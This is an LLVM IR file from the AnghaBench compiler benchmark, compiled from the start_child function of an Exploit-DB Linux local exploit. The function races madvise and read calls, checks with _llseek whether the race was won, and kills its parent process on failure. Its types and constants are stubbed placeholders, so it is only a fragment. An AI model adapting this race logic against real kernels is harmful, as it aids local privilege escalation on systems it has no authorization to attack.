; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_375.c_start_child.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_375.c_start_child.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@go = common dso_local global i32* null, align 8
@file = common dso_local global i32 0, align 4
@csize = common dso_local global i32 0, align 4
@MADV_DONTNEED = common dso_local global i32 0, align 4
@MADV_SEQUENTIAL = common dso_local global i32 0, align 4
@tv1 = common dso_local global i32 0, align 4
@pfd = common dso_local global i32 0, align 4
@buf = common dso_local global i32 0, align 4
@MADV_WILLNEED = common dso_local global i32 0, align 4
@r = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"madvise\00", align 1
@off = common dso_local global i32 0, align 4
@SEEK_CUR = common dso_local global i32 0, align 4
@SEEK_SET = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [6 x i8] c"lseek\00", align 1
@.str.2 = private unnamed_addr constant [15 x i8] c"\0A[+] Race won!\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [38 x i8] c"\0A[-] Race lost %d, use another file!\0A\00", align 1
@SIGTERM = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @start_child(i8* %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i32*, i32** @go, align 8
  %4 = getelementptr inbounds i32, i32* %3, i64 0
  store i32 0, i32* %4, align 4
  %5 = load i32, i32* @file, align 4
  %6 = load i32, i32* @csize, align 4
  %7 = load i32, i32* @MADV_DONTNEED, align 4
  %8 = call i32 @madvise(i32 %5, i32 %6, i32 %7)
  %9 = load i32, i32* @file, align 4
  %10 = load i32, i32* @csize, align 4
  %11 = load i32, i32* @MADV_SEQUENTIAL, align 4
  %12 = call i32 @madvise(i32 %9, i32 %10, i32 %11)
  %13 = call i32 @gettimeofday(i32* @tv1, i32* null)
  %14 = load i32, i32* @pfd, align 4
  %15 = load i32, i32* @buf, align 4
  %16 = call i32 @read(i32 %14, i32 %15, i32 0)
  %17 = load i32*, i32** @go, align 8
  %18 = getelementptr inbounds i32, i32* %17, i64 0
  store i32 1, i32* %18, align 4
  %19 = load i32, i32* @file, align 4
  %20 = load i32, i32* @csize, align 4
  %21 = load i32, i32* @MADV_WILLNEED, align 4
  %22 = call i32 @madvise(i32 %19, i32 %20, i32 %21)
  store i32 %22, i32* @r, align 4
  %23 = load i32, i32* @r, align 4
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %27

25:                                               ; preds = %1
  %26 = call i32 @fatal(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0))
  br label %27

27:                                               ; preds = %25, %1
  %28 = load i32*, i32** @go, align 8
  %29 = getelementptr inbounds i32, i32* %28, i64 1
  %30 = load i32, i32* %29, align 4
  %31 = icmp eq i32 %30, 1
  br i1 %31, label %37, label %32

32:                                               ; preds = %27
  %33 = load i32, i32* @pfd, align 4
  %34 = load i32, i32* @SEEK_CUR, align 4
  %35 = call i64 @_llseek(i32 %33, i32 0, i32 0, i32* @off, i32 %34)
  %36 = icmp slt i64 %35, 0
  br i1 %36, label %37, label %52

37:                                               ; preds = %32, %27
  %38 = load i32, i32* @pfd, align 4
  %39 = load i32, i32* @SEEK_SET, align 4
  %40 = call i64 @_llseek(i32 %38, i32 2147483647, i32 -1, i32* @off, i32 %39)
  %41 = trunc i64 %40 to i32
  store i32 %41, i32* @r, align 4
  %42 = load i32, i32* @r, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %46

44:                                               ; preds = %37
  %45 = call i32 @fatal(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  br label %46

46:                                               ; preds = %44, %37
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0))
  %48 = load i32, i32* @stdout, align 4
  %49 = call i32 @fflush(i32 %48)
  %50 = load i32*, i32** @go, align 8
  %51 = getelementptr inbounds i32, i32* %50, i64 0
  store i32 2, i32* %51, align 4
  br label %62

52:                                               ; preds = %32
  %53 = load i32*, i32** @go, align 8
  %54 = getelementptr inbounds i32, i32* %53, i64 1
  %55 = load i32, i32* %54, align 4
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.3, i64 0, i64 0), i32 %55)
  %57 = load i32, i32* @stdout, align 4
  %58 = call i32 @fflush(i32 %57)
  %59 = call i32 (...) @getppid()
  %60 = load i32, i32* @SIGTERM, align 4
  %61 = call i32 @kill(i32 %59, i32 %60)
  br label %62

62:                                               ; preds = %52, %46
  %63 = call i32 @_exit(i32 1) #3
  unreachable
}

declare dso_local i32 @madvise(i32, i32, i32) #1

declare dso_local i32 @gettimeofday(i32*, i32*) #1

declare dso_local i32 @read(i32, i32, i32) #1

declare dso_local i32 @fatal(i8*) #1

declare dso_local i64 @_llseek(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @getppid(...) #1

; Function Attrs: noreturn
declare dso_local i32 @_exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
